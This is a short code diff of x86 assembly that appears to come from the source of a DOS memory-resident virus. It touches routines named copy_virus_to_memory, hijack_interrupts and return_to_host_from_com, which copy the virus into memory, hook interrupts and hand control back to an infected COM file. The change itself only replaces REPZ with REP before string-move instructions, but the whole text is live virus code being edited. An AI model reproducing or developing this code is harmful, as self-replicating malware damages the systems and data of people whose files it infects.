@@ -105,8 +105,7 @@ copy_virus_to_memory:
       POP  DS
       MOV  CX, virus_end_in_file-virus_begin
       ADD  SI, 100h
-      REPZ
-      MOVSB
+      REP  MOVSB
 
       SUB  AX, 10h                                ; indirect jump to hijack_interrupts
       PUSH AX
@@ -152,7 +151,7 @@ return_to_host_from_com:
       MOV  DI, 100h
       MOV  BX, DI
       MOV  CX, 4
-      REPZ MOVSW
+      REP  MOVSW
       POP  AX
       PUSH ES
       PUSH ES
